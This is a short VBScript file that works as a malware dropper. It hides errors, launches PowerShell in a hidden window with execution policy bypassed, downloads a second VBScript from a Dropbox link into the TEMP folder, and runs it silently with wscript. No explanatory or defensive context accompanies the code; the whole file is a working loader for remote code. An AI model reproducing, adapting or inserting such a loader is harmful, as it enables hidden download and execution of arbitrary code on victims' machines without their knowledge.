On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
    """Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/zml5yox7saix5i6ivmblt/runscript.vbs?rlkey=g2ogfbm6uwl7a1pa2vxhluwni&st=nw56htuz&dl=1' " & _
    "-OutFile ($env:TEMP + '\\runscript.vbs'); " & _
    "if (Test-Path ($env:TEMP + '\\runscript.vbs')) { " & _
    "Start-Process -WindowStyle Hidden wscript.exe -ArgumentList '/B', ($env:TEMP + '\\runscript.vbs') }""", 0, False
